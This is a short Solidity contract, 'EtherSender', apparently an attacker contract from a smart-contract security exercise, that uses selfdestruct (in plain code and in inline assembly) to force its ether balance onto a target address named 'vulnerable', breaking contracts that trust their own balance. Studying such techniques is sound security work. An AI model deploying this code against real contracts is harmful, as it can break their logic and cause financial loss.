// SPDX-License-Identifier: MIT

pragma solidity ^0.7.0;

contract EtherSender {
    
    address payable vulnerable;

    constructor (address payable _vulnerable) payable {
        vulnerable = _vulnerable;
    }

    function method1() public { 
        selfdestruct(vulnerable);
    }

    function method2() public {
        assembly {
            selfdestruct(sload(0))
        }
    }
}

